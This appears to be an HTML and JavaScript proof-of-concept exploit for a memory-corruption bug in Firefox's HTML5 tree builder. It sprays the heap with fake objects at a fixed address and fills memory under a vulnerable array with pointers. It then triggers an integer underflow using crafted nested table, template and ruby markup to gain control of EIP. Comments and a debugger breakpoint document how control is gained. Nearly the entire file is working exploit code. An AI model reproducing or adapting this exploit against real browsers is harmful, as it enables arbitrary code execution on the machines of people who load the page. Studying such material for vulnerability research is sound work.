bp xul+107610 ".if (@edx != 30300000) {gc} .else {bp xul+0x2a170a}"
</title>
<script>

function testcase() {
    TARGET_OBJECT_ADDR = 0x30300000 
    EIP = 0x41414141
    junk = 0x13371337

    heap = []
    var current_address = 0x08000000
    var block_size = 0x1000000
    while(current_address < TARGET_OBJECT_ADDR){
        var fake_objects = new Uint32Array(block_size/4 - 0x100)
        for (var offset = 0; offset < block_size; offset += 0x100000){
            ///* our target object content at address TARGET_OBJECT_ADDR 
            //needed to control EIP, unset fields are automatically 0 */
            //fake_objects[offset/4 + 0x00/4] = 0x29 
            //fake_objects[offset/4 + 0x0c/4] = 3
            //fake_objects[offset/4 + 0x14/4] = TARGET_OBJECT_ADDR + 0x18
            //fake_objects[offset/4 + 0x18/4] = 1
            //fake_objects[offset/4 + 0x1c/4] = junk
            //fake_objects[offset/4 + 0x20/4] = TARGET_OBJECT_ADDR + 0x24
            //fake_objects[offset/4 + 0x24/4] = TARGET_OBJECT_ADDR + 0x28
            //fake_objects[offset/4 + 0x28/4] = TARGET_OBJECT_ADDR + 0x2c
            //fake_objects[offset/4 + 0x2c/4] = EIP

//--- GENERATED PART START ---
fake_objects[offset/4 + 0x40/4] = TARGET_OBJECT_ADDR+0x110; // 0xd0002000 -> -0x1fc0L (-0x1fc0L)
fake_objects[offset/4 + 0x44/4] = TARGET_OBJECT_ADDR+0x110; // 0xd0002000 -> -0x1fbcL (-0x1fbcL)
fake_objects[offset/4 + 0x2c/4] = 0x0; // 0xd0002000 -> -0x1fd4L (-0x1fd4L)
fake_objects[offset/4 + 0xc/4] = TARGET_OBJECT_ADDR+0x110; // 0xd0002000 -> 0xc (0xc)
fake_objects[offset/4 + 0x0/4] = 0xffffffff; // 0xd0002000 -> 0x0 (0x0)
fake_objects[offset/4 + -0x1000/4] = TARGET_OBJECT_ADDR+0x0; // 0xd0002000 -> -0x1000 (-0x1000)
fake_objects[offset/4 + 0x2000/4] = TARGET_OBJECT_ADDR+0x2ff0; // -0x1000 -> 0x2000 (0x2000)
fake_objects[offset/4 + 0x3000/4] = TARGET_OBJECT_ADDR+0x220; // 0x2000 -> 0x3000 (0x10L)
fake_objects[offset/4 + 0x1000/4] = TARGET_OBJECT_ADDR+0x330; // -0x1000 -> 0x1000 (0x1000)
fake_objects[offset/4 + 0xff8/4] = TARGET_OBJECT_ADDR+0x110; // 0xd0002000 -> -0x2008L (-0x2008L)
fake_objects[offset/4 + -0x2000/4] = TARGET_OBJECT_ADDR+0x110; // 0xd0002000 -> -0x2000 (-0x2000)
//--- GENERATED PART END ---
        }
        heap.push(fake_objects)
        current_address += block_size
    }
    
    document.body.innerHTML = '<table><svg><div id="BBBB">'
    a = new Array() // hold our Uint32Arrays
    var spray_size = 0x10100
    for (var i=0; i < spray_size; i++){
        /* use 0x100 sized arraybuffer chunks to occupy space under the vulnerable cpp array. It will be accessed via an underflow (iteration var) */
        a[i] = new Uint32Array(0x100/4)
        for (var j=0; j<0x100/4; j++)
            a[i][j] = TARGET_OBJECT_ADDR // cpp array element ptr, when accessed via integer underflow
    }

    /* source (point of control) is xul+0010760e:
        xul!nsHtml5TreeBuilder::startTag+0x114 [c:uilds\moz2_slave\m-rel-w32-00000000000000000000uild\src\parser\html
shtml5treebuilder.cpp @ 1095]:
        665a760e 8b12            mov     edx,dword ptr [edx] // <-- underflow access of cpp array pointed to by EDX => EDX results in TARGET_OBJECT_ADDR.
    */
    
    document.getElementById('BBBB').outerHTML = '<tr><title><ruby><template><table><template><td><col><em><table></tr><th></tr></td></table>hr {}<DD>'

    window.location.reload()
}
</script>
<body onload='testcase();'>
